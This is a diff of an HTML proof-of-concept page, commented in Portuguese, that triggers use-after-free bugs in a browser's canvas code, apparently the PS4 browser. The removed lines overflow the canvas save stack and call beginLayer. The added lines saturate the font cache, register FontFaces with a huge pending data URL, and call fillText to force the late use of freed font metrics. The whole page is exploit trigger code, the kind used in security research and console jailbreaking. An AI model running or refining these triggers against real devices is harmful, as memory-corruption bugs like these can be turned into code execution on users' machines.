@@ -1,30 +1,43 @@
-
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
-    <title>PoC - Canvas Layer UAF (e055837)</title>
+    <title>PoC - PS4 fillText / drawTextInternal UAF</title>
 </head>
 <body>
 <script>
-const canvas = document.createElement('canvas');
-canvas.width = 200;
-canvas.height = 200;
-canvas.style.cssText = 'position:absolute;left:-9999px';
-document.body.appendChild(canvas);
+    // 1. Satura o cache de fontes para forçar o prune inline no meio do width() chamado por drawTextInternal()
+    const dummies = [];
+    for (let i = 0; i < 3500; i++) {
+        const dummy = document.createElement('canvas').getContext('2d');
+        dummy.font = '10px "dummy' + i + '"';
+        dummies.push(dummy);
+    }
 
-const ctx = canvas.getContext('2d');
+    // 2. URL de fonte pendente grande para manter o estado assíncrono/reentrante
+    const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
 
-// Estoura o limite de saves da pilha (MaxSaveCount)
-for (let i = 0; i < 20000; i++) {
-    ctx.save();
-}
+    const metricsDonor = new FontFace('metricsDonor', pendingFontURL);
+    const measured = new FontFace('measured', pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
+    
+    document.fonts.add(metricsDonor);
+    document.fonts.add(measured);
 
-// Dispara o beginLayer com a pilha travada no limite, 
-// forçando o cenário de early exit e o UAF de camadas.
-ctx.beginLayer();
-ctx.beginLayer();
-ctx.beginLayer();
+    const canvas = document.createElement('canvas');
+    canvas.width = 200;
+    canvas.height = 200;
+    const context = canvas.getContext('2d');
+    
+    context.font = '10px metricsDonor, measured';
+
+    // 3. Dispara fillText (que invoca drawTextInternal no C++ do PS4),
+    // forçando a leitura de fontMetrics antes de font.width(), seguida do uso tardio das métricas.
+    try {
+        context.fillText('\u13A0\u13A2\u13A4', 10, 50);
+    } catch (e) {
+        console.error(e);
+    }
 </script>
 </body>
 </html>
+
